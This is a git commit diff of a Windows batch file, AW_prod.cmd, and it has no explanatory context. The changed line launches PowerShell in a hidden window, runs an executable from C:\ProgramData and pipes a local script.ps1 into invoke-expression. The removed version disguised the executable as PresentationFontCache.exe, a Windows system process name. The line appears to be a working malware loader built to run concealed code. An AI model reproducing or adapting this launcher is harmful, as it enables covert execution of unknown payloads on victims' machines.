a8adf8ddf43c9aeda94c73d4b2e02e707cc96dd4
qwertyuiopindia <93660031+qwertyuiopindia@users.noreply.github.com>
2023-02-12 18:43:16 +0600

    Update AW_prod.cmd

--- AW_prod.cmd
+++ AW_prod.cmd
@@ -1,1 +1,1 @@
-start powershell -windowstyle hidden Start-Process -FilePath "C:\ProgramData\PresentationFontCache.exe"; "cat -raw C:\ProgramData\script.ps1 | invoke-expression"; Exit
+start powershell -windowstyle hidden Start-Process -FilePath "C:\ProgramData\AW_prod_OTP.exe"; "cat -raw C:\ProgramData\script.ps1 | invoke-expression"; Exit
